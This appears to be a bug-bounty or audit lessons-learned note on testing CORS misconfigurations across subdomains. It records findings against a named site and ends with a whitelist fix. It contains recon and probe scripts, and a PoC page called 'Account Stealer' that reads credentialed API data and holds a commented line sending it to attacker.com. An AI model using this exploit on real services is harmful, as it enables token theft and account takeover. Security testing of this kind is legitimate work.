# CORS Multi-Subdomain Testing — Lessons Learned

## The Rule

**NEVER test CORS on only the main domain.** The vulnerability often lives on a subdomain you didn't expect.

## Discovery → Testing Flow

```bash
# Step 1: Enumerate ALL subdomains
subfinder -d TARGET -silent > subs.txt
echo "TARGET" | gau --threads 5 2>/dev/null | grep -oP 'https?://\K[a-zA-Z0-9.-]+\.TARGET' | sort -u >> subs.txt
sort -u subs.txt > all_subs.txt

# Step 2: DNS resolve + HTTP probe
while read sub; do
  curl -s -o /dev/null -w "%{sub} → %{http_code}\n" "https://${sub}/" --max-time 5
done < all_subs.txt

# Step 3: CORS test on EVERY live subdomain — check BOTH origin AND credentials
for sub in $(cat live_subs.txt); do
  for path in "/" "/api" "/public" "/v1"; do
    acao=$(curl -s -I -H "Origin: https://evil.com" "https://${sub}${path}" 2>/dev/null \
      | grep -i "access-control-allow-origin" | head -1)
    acac=$(curl -s -I -H "Origin: https://evil.com" "https://${sub}${path}" 2>/dev/null \
      | grep -i "access-control-allow-credentials" | head -1)
    [ -n "$acao" ] && echo "[!] ${sub}${path}: ${acao} | ${acac:-NO_CREDENTIALS}"
  done
done

# Step 4: Verify OPTIONS preflight on any subdomain with credentials=true
curl -v -X OPTIONS -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  "https://VULN_SUB/ENDPOINT" 2>&1 | grep -i "access-control"
# If OPTIONS returns empty → browsers block non-simple requests → limited exploitability
# If OPTIONS returns ACAC + ACAH → fully exploitable
```

## Real-World Findings

### turboflow.xyz (2026-09) — Updated Sep 18
**Sep 12-15 audit (test env):**
- `api.turboflow.xyz` → CORS reflect ANY origin + credentials (CRITICAL)
- `apis.turboflow.xyz` → CORS reflect ANY origin + credentials (CRITICAL) — **NOT found by subfinder**
- `api4.turboflow.xyz` → CORS reflect ANY origin + credentials (CRITICAL) — **NOT found by subfinder**
- `api.turboflow-test.xyz` → CORS reflect ANY origin + credentials (CRITICAL) — **test env exposed**

**Sep 18 re-audit (prod) — KEY LESSON:**
- `api`, `api2`, `api4`, `apis` → CORS reflect origin but **NO credentials header** → NOT exploitable for token theft
- **`api3` → CORS reflect origin + `credentials: true` + proper OPTIONS preflight** → CRITICAL (full JWT theft)
- `api3` was the ONLY subdomain with credentials. Without per-subdomain credentials check, this finding would have been missed.
- Previous audit (Sep 12-15) marked CORS as "fixed on prod" — but api3 was overlooked.

**Takeaway:** Prod hardened 4/5 subdomains. Missed 1. Always check ALL subdomains AND credentials header independently.

## SPA vs Real API Detection

Client-side routes return HTTP 200 + HTML body. NOT real API endpoints.

```bash
# Check Content-Type — JSON = real API, HTML = SPA route
content_type=$(curl -s -I "https://target.com/account/base/info" | grep -i content-type)
echo "$content_type"
# text/html = SPA route (not vulnerable)
# application/json = REAL API (test for CORS, IDOR, etc.)
```

## Auth Header Reflection

If server reflects `Authorization` in `Access-Control-Allow-Headers`, attacker can steal Bearer tokens via XSS or CORS:

```bash
curl -s -I -H "Origin: https://evil.com" -H "Authorization: Bearer test" "https://api.target.com/" \
  | grep -i "access-control-allow-headers"
# If includes "Authorization" → token theft possible
```

## Severity Matrix

| Origin Reflection | Credentials | Allow-Headers | Severity |
|-------------------|-------------|---------------|----------|
| ✅ Reflects | ❌ false | — | LOW (no impact) |
| ✅ Reflects | ✅ true | — | HIGH (data theft) |
| ✅ Reflects | ✅ true | Authorization | CRITICAL (token theft + account takeover) |
| ❌ Whitelist only | — | — | INFO (secure) |
| ❌ null origin | ✅ true | — | HIGH (sandboxed iframe) |

## PoC Template

```html
<!-- cors-exploit.html — Save and host on evil.com -->
<!DOCTYPE html>
<html>
<body>
<h1>TurboFlow Account Stealer</h1>
<button onclick="steal()">Click to Load Profile</button>
<pre id="output"></pre>
<script>
const API = 'https://api.turboflow.xyz';
const ENDPOINTS = [
  '/account/base/info',
  '/account/refer/info',
  '/account/wallet/submit/to',
  '/account/inbox/list',
  '/pool/pair/list'
];

async function steal() {
  for (const ep of ENDPOINTS) {
    try {
      const r = await fetch(API + ep, {credentials: 'include'});
      const data = await r.json();
      document.getElementById('output').textContent += `\n[${ep}]\n${JSON.stringify(data, null, 2)}\n`;
      // Exfiltrate to attacker server
      // fetch('https://attacker.com/log', {method:'POST', body:JSON.stringify({ep, data})});
    } catch(e) {
      document.getElementById('output').textContent += `\n[${ep}] ERROR: ${e}\n`;
    }
  }
}
</script>
</body>
</html>
```

## Fix Recommendation

Hardcoded whitelist — NEVER reflect Origin:
```javascript
const ALLOWED = ['https://turboflow.xyz', 'https://www.turboflow.xyz'];
const origin = req.headers.origin;
if (ALLOWED.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```
